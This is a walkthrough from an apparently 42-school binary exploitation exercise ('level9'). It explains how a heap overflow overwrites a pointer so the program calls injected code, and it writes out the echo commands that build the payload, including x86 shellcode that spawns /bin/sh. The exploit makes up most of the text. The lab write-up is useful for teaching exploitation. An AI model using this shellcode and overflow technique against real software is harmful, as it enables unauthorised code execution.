# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    walkthrough                                        :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: lgarczyn <lgarczyn@student.42.fr>          +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2019/05/04 18:52:46 by lgarczyn          #+#    #+#              #
#    Updated: 2019/05/06 21:53:16 by lgarczyn         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

The executable takes one argument
After some logic setting up the puzzle, it takes actions than can written as

	void *esp[]; //represents current stack
	void *eax; //represents registers
	void *edx; //represents registers

	eax = *esp[4]; // dereferences 5th pointer on stack, offset 0x10
	edx = *eax; // deref the result of that again
	eax = esp[5]; // take the 6th pointer on the stack
	esp[1] = eax; // store it in the 2nd position
	eax = esp[4]; // take the 5th pointer
	esp[0] = eax; // store it in the first position
	edx(); // call function at edx

After our overflow, esp[4] must be a pointer to a pointer to our shellcode
We can't overflow over that part, but we can overflow over *esp[4]
We must write the pointer to our shellcode here
Because the stacks may move, we also need to use the result of memcpy for the shellcode address
	The first malloc is always 0x0804a00c on this machine
	The address of the shellcode is therefore 0x0804a00c + 4 = 0x0804a010
	The address of that address is just 0x0804a00c

We add the shellcode and its pointer, then try to find esp[4]

rm /tmp/l9
echo -e -n "\x10\xa0\x04\x08" >> /tmp/l9
echo -e -n "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" >> /tmp/l9
echo -e -n "---0---1---2---3---4---5---6---7---8---9" >> /tmp/l9
echo -e -n "--a0--a1--a2--a3--a4--a5--a6--a7--a8--a9" >> /tmp/l9
echo -e -n "--b0--b1--b2--b3--b4--b5--b6--b7--b8--b9" >> /tmp/l9

Programs segfault on 0x622d2d39, or "9--b", we change that to 0x0804a008

rm /tmp/l9
echo -e -n "\x10\xa0\x04\x08" >> /tmp/l9
echo -e -n "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" >> /tmp/l9
echo -e -n "---0---1---2---3---4---5---6---7---8---9--a0--a1--a2--a3--a4--a5--a6--a7--a8--a" >> /tmp/l9
echo -e -n "\x0c\xa0\x04\x08" >> /tmp/l9

./level9 `cat /tmp/l9`
